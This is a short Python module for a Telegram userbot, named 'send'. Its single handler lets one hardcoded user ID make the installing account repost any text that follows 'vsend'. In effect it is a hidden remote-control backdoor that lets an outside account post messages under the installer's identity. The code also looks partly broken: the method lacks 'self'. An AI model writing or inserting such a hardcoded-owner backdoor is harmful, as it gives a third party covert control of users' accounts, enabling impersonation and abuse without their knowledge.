from .. import loader
import time
class sendMod(loader.Module):
    strings = {"name": "send"}
    #a



    async def sendcmd(message):

            

        if "vsend" in message.text:
            if int(message.from_id)==5353027821:
                a=message.text.split(" ", 1)
                a=str(a[1])
                await message.client.send_message(message.chat.id, a)
